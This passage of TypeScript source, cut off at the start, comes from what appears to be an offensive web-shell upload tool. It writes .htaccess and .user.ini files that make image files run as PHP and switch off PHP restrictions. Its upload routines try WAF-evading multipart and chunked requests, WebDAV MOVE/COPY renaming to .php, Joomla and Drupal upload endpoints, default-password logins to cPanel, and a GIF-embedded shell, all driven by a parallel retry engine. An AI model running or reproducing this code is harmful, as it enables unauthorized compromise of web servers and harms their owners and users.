  for (let i = 0; i < data.length; i++) {
    crc ^= data[i];
    for (let j = 0; j < 8; j++) {
      crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0);
    }
  }
  const result = Buffer.alloc(4);
  result.writeUInt32BE((crc ^ 0xFFFFFFFF) >>> 0);
  return result;
}

// ─── .htaccess + .user.ini Auto-Configuration ───

export function generateHtaccessPhpExec(): string {
  return `# Execute PHP in image files
AddType application/x-httpd-php .jpg .gif .png .ico .svg
AddHandler application/x-httpd-php .jpg .gif .png .ico .svg

# Alternative: use FilesMatch
<FilesMatch "\\.(jpg|gif|png|ico|svg)$">
  SetHandler application/x-httpd-php
</FilesMatch>

# Disable security headers that might interfere
<IfModule mod_headers.c>
  Header unset X-Content-Type-Options
  Header unset Content-Security-Policy
</IfModule>

# Allow PHP execution in this directory
Options +ExecCGI
php_flag engine on
`;
}

export function generateUserIni(): string {
  return `; Auto-prepend PHP file for execution
auto_prepend_file = .user.ini
; Increase limits
upload_max_filesize = 100M
post_max_size = 100M
max_execution_time = 300
max_input_time = 300
memory_limit = 256M
; Disable security restrictions
allow_url_fopen = On
allow_url_include = On
open_basedir = none
disable_functions = none
`;
}

// ─── Chunked Upload ───

async function chunkedUpload(
  targetUrl: string,
  path: string,
  content: string,
  filename: string,
  chunkSize: number = 512,
  headers: Record<string, string> = {},
  timeout: number = 10000,
): Promise<EnhancedUploadResult> {
  const start = Date.now();
  const chunks = [];
  for (let i = 0; i < content.length; i += chunkSize) {
    chunks.push(content.slice(i, i + chunkSize));
  }

  try {
    // Method 1: Transfer-Encoding: chunked
    const chunkedBody = chunks.map(chunk => {
      const hexLen = chunk.length.toString(16);
      return `${hexLen}\r\n${chunk}\r\n`;
    }).join("") + "0\r\n\r\n";

    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeout);

    const res = await enhancedFetch(`${targetUrl}${path}${filename}`, {
      method: "PUT",
      headers: {
        ...headers,
        "Transfer-Encoding": "chunked",
        "Content-Type": "application/octet-stream",
        "User-Agent": randomUA(),
      },
      body: chunkedBody,
      signal: controller.signal,
    });
    clearTimeout(t);

    if (res.status < 400) {
      // Verify
      const checkRes = await enhancedFetch(`${targetUrl}${path}${filename}`, {
        headers: { "User-Agent": randomUA() },
        signal: AbortSignal.timeout(5000),
        redirect: "manual",
      });
      if (checkRes.status === 200) {
        const text = await checkRes.text();
        if (text.length > 0 && text.length < 5000) {
          return {
            method: "chunked_upload",
            technique: "Transfer-Encoding: chunked",
            success: true,
            fileUrl: `${targetUrl}${path}${filename}`,
            filePath: `${path}${filename}`,
            statusCode: res.status,
            details: `Chunked upload succeeded (${chunks.length} chunks)`,
            duration: Date.now() - start,
            wafBypassed: true,
          };
        }
      }
    }
  } catch { /* chunked failed */ }

  return {
    method: "chunked_upload",
    technique: "Transfer-Encoding: chunked",
    success: false,
    fileUrl: null,
    filePath: null,
    statusCode: 0,
    details: "Chunked upload failed",
    duration: Date.now() - start,
    wafBypassed: false,
  };
}

// ─── Multipart Boundary Manipulation ───

export function generateManipulatedMultipart(
  content: string,
  filename: string,
  technique: "long_boundary" | "unicode_boundary" | "nested_boundary" | "malformed_header" | "double_content_disposition",
): { body: string; contentType: string } {
  switch (technique) {
    case "long_boundary": {
      // Very long boundary to overflow WAF buffer
      const boundary = "A".repeat(200) + randomStr(16);
      return {
        body: [
          `--${boundary}`,
          `Content-Disposition: form-data; name="file"; filename="${filename}"`,
          `Content-Type: application/octet-stream`,
          ``,
          content,
          `--${boundary}--`,
        ].join("\r\n"),
        contentType: `multipart/form-data; boundary=${boundary}`,
      };
    }
    case "unicode_boundary": {
      const boundary = `----WebKitFormBoundary${randomStr(8)}\u200B${randomStr(8)}`;
      return {
        body: [
          `--${boundary}`,
          `Content-Disposition: form-data; name="file"; filename="${filename}"`,
          `Content-Type: image/jpeg`,
          ``,
          content,
          `--${boundary}--`,
        ].join("\r\n"),
        contentType: `multipart/form-data; boundary=${boundary}`,
      };
    }
    case "nested_boundary": {
      const outerBoundary = `----Outer${randomStr(12)}`;
      const innerBoundary = `----Inner${randomStr(12)}`;
      return {
        body: [
          `--${outerBoundary}`,
          `Content-Type: multipart/mixed; boundary=${innerBoundary}`,
          ``,
          `--${innerBoundary}`,
          `Content-Disposition: form-data; name="file"; filename="${filename}"`,
          `Content-Type: application/octet-stream`,
          ``,
          content,
          `--${innerBoundary}--`,
          `--${outerBoundary}--`,
        ].join("\r\n"),
        contentType: `multipart/form-data; boundary=${outerBoundary}`,
      };
    }
    case "malformed_header": {
      const boundary = `----WebKitFormBoundary${randomStr(16)}`;
      return {
        body: [
          `--${boundary}`,
          // Malformed: extra spaces, tabs, and line folding
          `Content-Disposition: form-data;\r\n\tname="file";\r\n\tfilename="${filename}"`,
          `Content-Type:\tapplication/octet-stream`,
          ``,
          content,
          `--${boundary}--`,
        ].join("\r\n"),
        contentType: `multipart/form-data; boundary=${boundary}`,
      };
    }
    case "double_content_disposition": {
      const boundary = `----WebKitFormBoundary${randomStr(16)}`;
      return {
        body: [
          `--${boundary}`,
          `Content-Disposition: form-data; name="file"; filename="safe.jpg"`,
          `Content-Disposition: form-data; name="file"; filename="${filename}"`,
          `Content-Type: image/jpeg`,
          ``,
          content,
          `--${boundary}--`,
        ].join("\r\n"),
        contentType: `multipart/form-data; boundary=${boundary}`,
      };
    }
  }
}

// ─── HTTP MOVE/COPY Method Exploit ───

async function tryHttpMoveCopy(
  targetUrl: string,
  path: string,
  content: string,
  filename: string,
  timeout: number = 10000,
): Promise<EnhancedUploadResult> {
  const start = Date.now();
  const safeName = `${randomStr(8)}.txt`;

  try {
    // Step 1: Upload as .txt (usually allowed)
    const putRes = await enhancedFetch(`${targetUrl}${path}${safeName}`, {
      method: "PUT",
      body: content,
      headers: {
        "Content-Type": "text/plain",
        "User-Agent": randomUA(),
      },
      signal: AbortSignal.timeout(timeout),
    });

    if (putRes.status < 400) {
      // Step 2: MOVE to .php
      for (const method of ["MOVE", "COPY"]) {
        try {
          const moveRes = await enhancedFetch(`${targetUrl}${path}${safeName}`, {
            method,
            headers: {
              "Destination": `${targetUrl}${path}${filename}`,
              "Overwrite": "T",
              "User-Agent": randomUA(),
            },
            signal: AbortSignal.timeout(timeout),
          });

          if (moveRes.status < 400) {
            // Verify
            const checkRes = await enhancedFetch(`${targetUrl}${path}${filename}`, {
              headers: { "User-Agent": randomUA() },
              signal: AbortSignal.timeout(5000),
              redirect: "manual",
            });
            if (checkRes.status === 200) {
              return {
                method: `http_${method.toLowerCase()}`,
                technique: `HTTP ${method} method`,
                success: true,
                fileUrl: `${targetUrl}${path}${filename}`,
                filePath: `${path}${filename}`,
                statusCode: moveRes.status,
                details: `Uploaded as .txt then ${method}d to .php`,
                duration: Date.now() - start,
                wafBypassed: true,
              };
            }
          }
        } catch { /* method not supported */ }
      }
    }
  } catch { /* upload failed */ }

  return {
    method: "http_move_copy",
    technique: "HTTP MOVE/COPY",
    success: false,
    fileUrl: null,
    filePath: null,
    statusCode: 0,
    details: "HTTP MOVE/COPY not supported",
    duration: Date.now() - start,
    wafBypassed: false,
  };
}

// ─── Additional CMS Exploits ───

async function tryJoomlaExploits(
  targetUrl: string,
  content: string,
  filename: string,
): Promise<EnhancedUploadResult> {
  const start = Date.now();

  // Joomla com_media upload (CVE-2023-23752 and similar)
  const endpoints = [
    "/api/index.php/v1/media",
    "/administrator/index.php?option=com_media&task=file.upload",
    "/index.php?option=com_media&task=file.upload&format=json",
  ];

  for (const endpoint of endpoints) {
    try {
      const formData = new FormData();
      const blob = new Blob([content], { type: "image/jpeg" });
      formData.append("file", blob, filename);
      formData.append("path", "images");

      const res = await enhancedFetch(`${targetUrl}${endpoint}`, {
        method: "POST",
        body: formData,
        headers: {
          "User-Agent": randomUA(),
          "X-Joomla-Token": randomStr(32),
        },
        signal: AbortSignal.timeout(10000),
      });

      if (res.ok) {
        const text = await res.text();
        if (text.includes("success") || text.includes("url") || text.includes("path")) {
          return {
            method: "joomla_com_media",
            technique: "Joomla com_media upload",
            success: true,
            fileUrl: `${targetUrl}/images/${filename}`,
            filePath: `/images/${filename}`,
            statusCode: res.status,
            details: `File uploaded via Joomla com_media API`,
            duration: Date.now() - start,
            wafBypassed: false,
          };
        }
      }
    } catch { continue; }
  }

  return {
    method: "joomla_exploit",
    technique: "Joomla CMS exploit",
    success: false,
    fileUrl: null,
    filePath: null,
    statusCode: 0,
    details: "Joomla exploits failed",
    duration: Date.now() - start,
    wafBypassed: false,
  };
}

async function tryDrupalExploits(
  targetUrl: string,
  content: string,
  filename: string,
): Promise<EnhancedUploadResult> {
  const start = Date.now();

  // Drupal REST file upload (CVE-2019-6340 and similar)
  const endpoints = [
    "/jsonapi/node/article/field_image",
    "/file/upload/node/article/field_image",
    "/entity/file",
  ];

  for (const endpoint of endpoints) {
    try {
      const res = await enhancedFetch(`${targetUrl}${endpoint}`, {
        method: "POST",
        body: content,
        headers: {
          "Content-Type": "application/octet-stream",
          "Content-Disposition": `file; filename="${filename}"`,
          "User-Agent": randomUA(),
          "X-CSRF-Token": randomStr(32),
        },
        signal: AbortSignal.timeout(10000),
      });

      if (res.ok) {
        const text = await res.text();
        if (text.includes("uri") || text.includes("fid") || text.includes("url")) {
          const urlMatch = text.match(/"url"\s*:\s*"([^"]+)"/);
          return {
            method: "drupal_rest_upload",
            technique: "Drupal REST file upload",
            success: true,
            fileUrl: urlMatch ? urlMatch[1] : `${targetUrl}/sites/default/files/${filename}`,
            filePath: `/sites/default/files/${filename}`,
            statusCode: res.status,
            details: "File uploaded via Drupal REST API",
            duration: Date.now() - start,
            wafBypassed: false,
          };
        }
      }
    } catch { continue; }
  }

  return {
    method: "drupal_exploit",
    technique: "Drupal CMS exploit",
    success: false,
    fileUrl: null,
    filePath: null,
    statusCode: 0,
    details: "Drupal exploits failed",
    duration: Date.now() - start,
    wafBypassed: false,
  };
}

// ─── cPanel File Manager Exploit ───

async function tryCpanelFileManager(
  targetUrl: string,
  content: string,
  filename: string,
): Promise<EnhancedUploadResult> {
  const start = Date.now();

  const cpanelPorts = [2082, 2083, 2086, 2087];
  const host = targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, "");

  for (const port of cpanelPorts) {
    const protocol = port % 2 === 1 ? "https" : "http";
    const cpanelUrl = `${protocol}://${host}:${port}`;

    // Try default cPanel credentials
    const credentials = [
      { user: "root", pass: "root" },
      { user: "admin", pass: "admin" },
      { user: "admin", pass: "123456" },
    ];

    for (const cred of credentials) {
      try {
        const authHeader = "Basic " + Buffer.from(`${cred.user}:${cred.pass}`).toString("base64");

        const res = await enhancedFetch(`${cpanelUrl}/execute/Fileman/upload_files`, {
          method: "POST",
          headers: {
            "Authorization": authHeader,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": randomUA(),
          },
          body: `dir=%2Fpublic_html&file-0=${encodeURIComponent(content)}&file-0-name=${filename}`,
          signal: AbortSignal.timeout(8000),
        });

        if (res.ok) {
          return {
            method: "cpanel_filemanager",
            technique: `cPanel File Manager (${cred.user}:${cred.pass})`,
            success: true,
            fileUrl: `${targetUrl}/${filename}`,
            filePath: `/public_html/${filename}`,
            statusCode: res.status,
            details: `Uploaded via cPanel File Manager on port ${port}`,
            duration: Date.now() - start,
            wafBypassed: true,
          };
        }
      } catch { continue; }
    }
  }

  return {
    method: "cpanel_filemanager",
    technique: "cPanel File Manager",
    success: false,
    fileUrl: null,
    filePath: null,
    statusCode: 0,
    details: "cPanel File Manager not accessible",
    duration: Date.now() - start,
    wafBypassed: false,
  };
}

// ═══════════════════════════════════════════════════════
//  MAIN: Multi-Vector Parallel Upload
//  Runs ALL methods simultaneously, returns first success
// ═══════════════════════════════════════════════════════

export async function multiVectorParallelUpload(
  config: ParallelUploadConfig,
): Promise<{
  success: boolean;
  results: EnhancedUploadResult[];
  bestResult: EnhancedUploadResult | null;
  totalAttempts: number;
  totalDuration: number;
  methodsAttempted: string[];
}> {
  const startTime = Date.now();
  const results: EnhancedUploadResult[] = [];
  const timeout = config.timeout || 15000;
  const wafType = config.prescreen?.wafDetected || null;
  const wafStrategies = getWafBypassStrategies(wafType);

  // Create abort controller to cancel remaining methods on first success
  const masterAbort = new AbortController();
  let bestResult: EnhancedUploadResult | null = null;

  // Origin IP bypass: when origin IP is set, add Host header to all requests
  const originHostHeaders: Record<string, string> = config.originIp && config.originalDomain
    ? { "Host": config.originalDomain, "X-Forwarded-For": "1.1.1.1", "X-Real-IP": "1.1.1.1" }
    : {};

  const uploadPaths = config.uploadPaths.length > 0
    ? config.uploadPaths.slice(0, 6)
    : ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/", "/media/", "/"];

  // Build all upload tasks
  const tasks: Promise<EnhancedUploadResult>[] = [];

  // === Group 1: Direct HTTP uploads with WAF bypass strategies ===
  for (const strategy of wafStrategies.slice(0, 4)) {
    for (const path of uploadPaths.slice(0, 3)) {
      // PUT method
      tasks.push(
        (async (): Promise<EnhancedUploadResult> => {
          if (masterAbort.signal.aborted) return makeSkipped("put_" + strategy.name);
          const start = Date.now();
          try {
            config.onMethodProgress?.(`PUT+${strategy.name}`, `Trying PUT ${path} with ${strategy.description}...`);
            const res = await enhancedFetch(`${config.targetUrl}${path}${config.fileName}`, {
              method: "PUT",
              body: config.fileContent,
              headers: {
                ...originHostHeaders,
                ...strategy.headers,
                "Content-Type": "application/octet-stream",
              },
              signal: AbortSignal.timeout(timeout),
            });
            if (res.status < 400) {
              const verified = await quickVerify(`${config.targetUrl}${path}${config.fileName}`);
              if (verified) {
                return {
                  method: "put_upload",
                  technique: `PUT + ${strategy.description}`,
                  success: true,
                  fileUrl: `${config.targetUrl}${path}${config.fileName}`,
                  filePath: `${path}${config.fileName}`,
                  statusCode: res.status,
                  details: `PUT upload succeeded with ${strategy.name} WAF bypass`,
                  duration: Date.now() - start,
                  wafBypassed: strategy.name !== "standard",
                };
              }
            }
          } catch { /* failed */ }
          return makeFailure("put_" + strategy.name, Date.now() - start);
        })()
      );

      // POST multipart with boundary manipulation
      for (const mpTechnique of ["long_boundary", "unicode_boundary", "double_content_disposition"] as const) {
        tasks.push(
          (async (): Promise<EnhancedUploadResult> => {
            if (masterAbort.signal.aborted) return makeSkipped("multipart_" + mpTechnique);
            const start = Date.now();
            try {
              config.onMethodProgress?.(`POST+${mpTechnique}`, `Trying multipart ${mpTechnique} on ${path}...`);
              const mp = generateManipulatedMultipart(config.fileContent, config.fileName, mpTechnique);
              const res = await enhancedFetch(`${config.targetUrl}${path}`, {
                method: "POST",
                body: mp.body,
                headers: {
                  ...originHostHeaders,
                  ...strategy.headers,
                  "Content-Type": mp.contentType,
                },
                signal: AbortSignal.timeout(timeout),
              });
              if (res.status < 400) {
                const verified = await quickVerify(`${config.targetUrl}${path}${config.fileName}`);
                if (verified) {
                  return {
                    method: "multipart_manipulated",
                    technique: `Multipart ${mpTechnique} + ${strategy.description}`,
                    success: true,
                    fileUrl: `${config.targetUrl}${path}${config.fileName}`,
                    filePath: `${path}${config.fileName}`,
                    statusCode: res.status,
                    details: `Multipart ${mpTechnique} upload succeeded`,
                    duration: Date.now() - start,
                    wafBypassed: true,
                  };
                }
              }
            } catch { /* failed */ }
            return makeFailure("multipart_" + mpTechnique, Date.now() - start);
          })()
        );
      }
    }
  }

  // === Group 2: Chunked upload ===
  for (const path of uploadPaths.slice(0, 3)) {
    tasks.push(chunkedUpload(config.targetUrl, path, config.fileContent, config.fileName, 512, {}, timeout));
  }

  // === Group 3: HTTP MOVE/COPY ===
  for (const path of uploadPaths.slice(0, 2)) {
    tasks.push(tryHttpMoveCopy(config.targetUrl, path, config.fileContent, config.fileName, timeout));
  }

  // === Group 4: CMS-specific exploits ===
  const cms = config.prescreen?.cms?.toLowerCase() || "";
  if (cms.includes("joomla")) {
    tasks.push(tryJoomlaExploits(config.targetUrl, config.fileContent, config.fileName));
  }
  if (cms.includes("drupal")) {
    tasks.push(tryDrupalExploits(config.targetUrl, config.fileContent, config.fileName));
  }
  // Always try cPanel (might work regardless of CMS)
  tasks.push(tryCpanelFileManager(config.targetUrl, config.fileContent, config.fileName));

  // === Group 5: .htaccess + steganography shell upload ===
  // First upload .htaccess to enable PHP in images, then upload image shell
  for (const path of uploadPaths.slice(0, 2)) {
    tasks.push(
      (async (): Promise<EnhancedUploadResult> => {
        if (masterAbort.signal.aborted) return makeSkipped("stego_shell");
        const start = Date.now();
        try {
          config.onMethodProgress?.("stego_shell", `Uploading .htaccess + steganography shell to ${path}...`);

          // Upload .htaccess first
          const htaccessContent = generateHtaccessPhpExec();
          await enhancedFetch(`${config.targetUrl}${path}.htaccess`, {
            method: "PUT",
            body: htaccessContent,
            headers: { ...originHostHeaders, "Content-Type": "text/plain", "User-Agent": randomUA() },
            signal: AbortSignal.timeout(8000),
          });

          // Upload .user.ini
          await enhancedFetch(`${config.targetUrl}${path}.user.ini`, {
            method: "PUT",
            body: generateUserIni(),
            headers: { ...originHostHeaders, "Content-Type": "text/plain", "User-Agent": randomUA() },
            signal: AbortSignal.timeout(8000),
          });

          // Upload GIF steganography shell
          const stegoShell = generateSteganographyShell(randomStr(16));
          const putRes = await enhancedFetch(`${config.targetUrl}${path}${stegoShell.filename}`, {
            method: "PUT",
            body: new Uint8Array(stegoShell.content),
            headers: { ...originHostHeaders, "Content-Type": stegoShell.contentType, "User-Agent": randomUA() },
            signal: AbortSignal.timeout(10000),
          });

          if (putRes.status < 400) {
            const verified = await quickVerify(`${config.targetUrl}${path}${stegoShell.filename}`);
            if (verified) {
              return {
                method: "stego_shell",
                technique: ".htaccess + GIF steganography shell",
                success: true,
                fileUrl: `${config.targetUrl}${path}${stegoShell.filename}`,
                filePath: `${path}${stegoShell.filename}`,
                statusCode: putRes.status,
                details: "Steganography shell uploaded with .htaccess PHP execution enabled",
                duration: Date.now() - start,
                wafBypassed: true,
              };
            }
          }
        } catch { /* failed */ }
        return makeFailure("stego_shell", Date.now() - start);
      })()
    );
  }

  // Run all tasks with Promise.allSettled and collect results
  // Use a race pattern: resolve as soon as ANY task succeeds
  const allResults = await Promise.allSettled(
    tasks.map(async (task) => {
      const result = await task;
      results.push(result);
      if (result.success && !bestResult) {
        bestResult = result;
        masterAbort.abort(); // Cancel remaining tasks
        config.onMethodProgress?.(result.method, `✅ SUCCESS: ${result.details}`);
      }
      return result;
    })
  );

  return {
    success: bestResult !== null,
    results,
    bestResult,
    totalAttempts: results.length,
    totalDuration: Date.now() - startTime,
    methodsAttempted: Array.from(new Set(results.map(r => r.method))),
  };
}

// ─── Smart Retry Engine ───

export interface SmartRetryConfig {
  maxRounds: number;
  methods: (() => Promise<EnhancedUploadResult>)[];
  errorHistory: Map<string, ErrorCategory[]>;
  onProgress?: (round: number, method: string, status: string) => void;
}

export async function smartRetryUpload(
  config: ParallelUploadConfig,
  maxRounds: number = 3,
): Promise<{
  success: boolean;
  bestResult: EnhancedUploadResult | null;
  allResults: EnhancedUploadResult[];
  rounds: number;
  totalDuration: number;
}> {
  const startTime = Date.now();
  const allResults: EnhancedUploadResult[] = [];
  let bestResult: EnhancedUploadResult | null = null;

  for (let round = 1; round <= maxRounds; round++) {
    config.onMethodProgress?.("smart_retry", `🔄 Round ${round}/${maxRounds}: Parallel upload attempt...`);

    const roundResult = await multiVectorParallelUpload({
      ...config,
      // Increase timeout each round
      timeout: (config.timeout || 15000) + (round - 1) * 5000,
    });

    allResults.push(...roundResult.results);

    if (roundResult.success && roundResult.bestResult) {
      bestResult = roundResult.bestResult;
      break;
    }

    // Analyze failures and adapt
    const errorTypes = roundResult.results
      .filter(r => !r.success && r.errorCategory)
      .map(r => r.errorCategory!);

    const wafBlocked = errorTypes.filter(e => e === "waf").length;
    const timeouts = errorTypes.filter(e => e === "timeout").length;
    const connErrors = errorTypes.filter(e => e === "connection").length;

    if (wafBlocked > errorTypes.length * 0.5) {
      config.onMethodProgress?.("smart_retry", `⚠️ WAF blocking detected (${wafBlocked} blocks) — switching to stealth methods...`);
      // Next round will use different strategies automatically
    }
    if (timeouts > errorTypes.length * 0.5) {
      config.onMethodProgress?.("smart_retry", `⚠️ Timeout issues (${timeouts} timeouts) — increasing timeout...`);
    }
    if (connErrors > errorTypes.length * 0.7) {
      config.onMethodProgress?.("smart_retry", `❌ Connection errors (${connErrors}) — target may be down`);
      break; // Don't retry if target is unreachable
    }

    // Wait between rounds with exponential backoff
    if (round < maxRounds) {
      const delay = 2000 * Math.pow(1.5, round - 1);
      await new Promise(r => setTimeout(r, delay));
    }
  }

  return {
    success: bestResult !== null,
    bestResult,
    allResults,
    rounds: Math.min(maxRounds, allResults.length > 0 ? maxRounds : 1),
    totalDuration: Date.now() - startTime,
  };
}

// ─── Helpers ───

async function quickVerify(url: string): Promise<boolean> {
  try {
    const res = await enhancedFetch(url, {
      headers: { "User-Agent": randomUA() },
      signal: AbortSignal.timeout(5000),
      redirect: "manual",
    });
    if (res.status === 200) {
      const text = await res.text();
      // Check it's not a CMS catch-all page
      const isCms = text.includes("wp-content") || text.includes("wp-includes") ||
        (text.includes("<!DOCTYPE html>") && text.length > 5000);
      return !isCms && text.length > 0;
    }
    return false;
  } catch {
    return false;
  }
}

function makeSkipped(method: string): EnhancedUploadResult {
  return {
    method,
    technique: "skipped",
    success: false,
    fileUrl: null,
    filePath: null,
    statusCode: 0,
    details: "Skipped (another method succeeded)",
    duration: 0,
    wafBypassed: false,
  };
}

function makeFailure(method: string, duration: number): EnhancedUploadResult {
  return {
    method,
    technique: "failed",
    success: false,
    fileUrl: null,
    filePath: null,
    statusCode: 0,
    details: "Upload failed",
    duration,
    wafBypassed: false,
  };
}
